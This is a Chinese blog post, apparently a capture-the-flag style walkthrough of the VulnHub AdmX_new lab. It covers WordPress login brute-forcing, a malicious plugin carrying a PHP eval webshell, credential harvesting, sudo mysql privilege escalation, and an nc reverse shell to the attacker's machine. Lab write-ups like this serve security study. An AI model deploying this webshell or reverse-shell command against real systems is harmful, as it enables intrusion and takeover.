@@ -1,0 +1,311 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x04-VulnHub靶机-AdmX_new  | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x04-VulnHub靶机-AdmX_new  | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+0x04
+地址:https://download.vulnhub.com/admx/AdmX_new.7z
+用 virtualbox打开 而且要去修改一下 https://mp.weixin.qq.com/s/9nuapORqlcYP..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x04-VulnHub靶机-AdmX_new 
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-02
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>0x04<br>
+地址:https://download.vulnhub.com/admx/AdmX_new.7z</p>
+<p>用 virtualbox打开 而且要去修改一下 https://mp.weixin.qq.com/s/9nuapORqlcYPl-Fo9am9fQ</p>
+<p>难度=&gt;中</p>
+<h3 id="内容">内容</h3>
+<ul>
+<li>BurpSuite内容替换</li>
+<li>密码爆破 (我的字典太小了 没爆破出来 )</li>
+<li>Wordpress后台漏洞利用</li>
+<li>利用MySQL提权(sudo+执行系统命令)</li>
+</ul>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>主机收集搞了半天 东有问题 西有问题啊 真难顶啊</p>
+<p>然后本来好了 我以为是扫到我虚拟机了    就开了个80</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012012472.png" alt="image-20240301201205430" loading="lazy"></figure>
+<p>扫一下目录</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012023206.png" alt="image-20240301202339182" loading="lazy"></figure>
+<p>存在wordpress</p>
+<p>http://192.168.3.95/tools/adminer.php   感觉后面应该用得到 找到他的账号密码  这种是可以直接连的  一般情况mysql是不支持外连   而这种不算外连</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012025250.png" alt="image-20240301202528226" loading="lazy"></figure>
+<p>这个页面很奇怪啊  而且很卡    为什么这么久都没完整加载上来   用burp 看看整个过程是怎么样的</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012031822.png" alt="image-20240301203141790" loading="lazy"></figure>
+<p>看到另外一个ip   去访问http://192.168.3.95/wordpress/的过程中 访问了很多次 这个ip 192.168.159.145(访问不到)  这就是页面奇怪 卡的原因 (这个的原因是因为我们前期修改了环境)</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012047861.png" alt="image-20240301204729836" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012050881.png" alt="image-20240301205041842" loading="lazy"></figure>
+<p>在burp 上修改</p>
+<p>这些个东西是从目标服务器给客户端浏览器的返回的数据硬编码写入的</p>
+<p>所以改 response header 响应头     response body 响应包</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403020956552.png" alt="image-20240302095629523" loading="lazy"></figure>
+<p>就变成了这个样子了</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012102235.png" alt="image-20240301210208173" loading="lazy"></figure>
+<p>这些都变了</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012103548.png" alt="image-20240301210352462" loading="lazy"></figure>
+<p>然后往下渗透   可以看到版本    但是去找 也没什么可以利用的</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012104885.png" alt="image-20240301210459835" loading="lazy"></figure>
+<p>这个登录界面    当我输入admin时候的提示</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012110056.png" alt="image-20240301211055036" loading="lazy"></figure>
+<p>当我输入admin1213123时</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012111368.png" alt="image-20240301211127341" loading="lazy"></figure>
+<p>说明 admin账号是存在的   而且没有啥验证  所以就利用 burp 进行爆破</p>
+<p>而且密码也没进行加密  更加利于爆破了</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403012113076.png" alt="image-20240301211308038" loading="lazy"></figure>
+<p>但是爆破不出来 (笑死 我的字典太垃圾了)  能够爆破出来的  adam14</p>
+<h2 id="渗透">渗透</h2>
+<p>进入后台 可以看到</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021004229.png" alt="image-20240302100408169" loading="lazy"></figure>
+<h3 id="wordpress后台">wordpress后台</h3>
+<p>一般wordpress获取shell有三种方式</p>
+<p>通过media上传shell文件，但是需要特定的漏洞版本</p>
+<p>修改主题php代码  上传一句话（蚁剑）<img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021010238.png" alt="image-20240302101047216" loading="lazy"></p>
+<p>第三种方法是使用plugins功能，安装一个我们编写的webshell 插件。在这里我新建了一个webshell.php的文件，并且<strong>压缩成zip</strong>格式，上传至WordPress的plugins处进行安装，并点击activa plugin进行激活插件。</p>
+<p>使用第二种，在主题元素进行插入，如果上传成功，直接访问404.php，拿到shell，但结果是上传一句话时，点击更新，系统提示更改失败</p>
+<p>试图修改已有的plugins代码   更新不了   所以自己上传个plugins      (这里也可以用msf 来拿shell)</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021017252.png" alt="image-20240302101756214" loading="lazy"></figure>
+<pre><code>//前面这些注释要有 才能够导入 
+&lt;?php
+
+/*
+
+Plugin Name: Webshell
+
+Plugin URI: https://github.com/171/
+
+Description: Wordpress Webshell for Pentest
+
+Version: 1.0
+
+Author: 123
+
+Author URI: https://github.com/171/
+
+License: https://github.com/171/
+
+*/
+
+eval($_POST[&quot;pass&quot;]);
+//system($_GET['cmd']); 也可以这样  这样就是用nc  python 去反弹shell了 没蚁剑 哥斯拉的shell好 
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021019417.png" alt="image-20240302101947382" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021031824.png" alt="image-20240302103128800" loading="lazy"></figure>
+<p>找到地址   好像是访问哪个路径都可以的</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021038217.png" alt="image-20240302103829191" loading="lazy"></figure>
+<p>然后用哥斯拉去连接   权限不够 需要提权。</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021039665.png" alt="image-20240302103930644" loading="lazy"></figure>
+<h2 id="试图udf提权">试图udf提权</h2>
+<p>sudo suid都没有</p>
+<p>用 cat /passwd 发现还有个用户</p>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021051175.png" alt="image-20240302105100149" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021052559.png" alt="image-20240302105216531" loading="lazy"></figure>
+<p>翻到个数据库配置文件  首先想到去登录刚开始发现的那个登录页面</p>
+<figure data-type="image" tabindex="22"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021055720.png" alt="image-20240302105544690" loading="lazy"></figure>
+<p>尝试在后台页面 用sql语句写入一个后门代码    想着可能两个shell的权限会不一样   试了几种写法但是都写不进去</p>
+<p>https://xz.aliyun.com/t/11225</p>
+<figure data-type="image" tabindex="23"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021119222.png" alt="image-20240302111939194" loading="lazy"></figure>
+<p>试图连接上工具 然后看看能不能udf提权  结果 我冰蝎的🐎 连上去了 但是工具连不上</p>
+<figure data-type="image" tabindex="24"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021136592.png" alt="image-20240302113644537" loading="lazy"></figure>
+<h2 id="提权2">提权2</h2>
+<p>开始收集了个用户 wpadmin  还有一个进后台的密码 一个数据库密码 试试能不能su进去</p>
+<p>但是在哥斯拉上 这个会话不是交互式的  su 不了(不可以输入密码 ) 所以我反弹到kali上     我需要反弹会话到kali</p>
+<p>在这个会话 可以su到wpadmin  然后再看看那个home中wpadmin下面的是什么  得到第一个flag (也可以试试那两个密码可不可以su到root)</p>
+<figure data-type="image" tabindex="25"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021244723.png" alt="image-20240302124436690" loading="lazy"></figure>
+<p>下一步提到root  看看 sudo -l	 发现一个mysql命令 不需要密码就可以 以root执行</p>
+<figure data-type="image" tabindex="26"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021249718.png" alt="image-20240302124948688" loading="lazy"></figure>
+<p>sudo mysql -u root -D wordpress  -p     // 要加个sudo</p>
+<figure data-type="image" tabindex="27"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021305196.png" alt="" loading="lazy"></figure>
+<p>然后再用nc反弹一下 /bin/bash | nc 192.168.3.87 6768   (可以用nc串联的 )</p>
+<p>这样也行</p>
+<figure data-type="image" tabindex="28"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403021312171.png" alt="image-20240302131229085" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>直接尝试的udf提权不行诶  用冰蝎做了代理 还是搞不了</p>
+<p>先用简单 易操作的方法提权  实在不行再用那种操作复杂的</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a><br>
+*
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E6%B8%97%E9%80%8F">渗透</a>
+<ul>
+<li><a href="#wordpress%E5%90%8E%E5%8F%B0">wordpress后台</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%95%E5%9B%BEudf%E6%8F%90%E6%9D%83">试图udf提权</a></li>
+<li><a href="#%E6%8F%90%E6%9D%832">提权2</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/vulnhub-ba-ji-chronos/">
+              <h3 class="post-title">
+                0x03-VulnHub靶机-Chronos
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
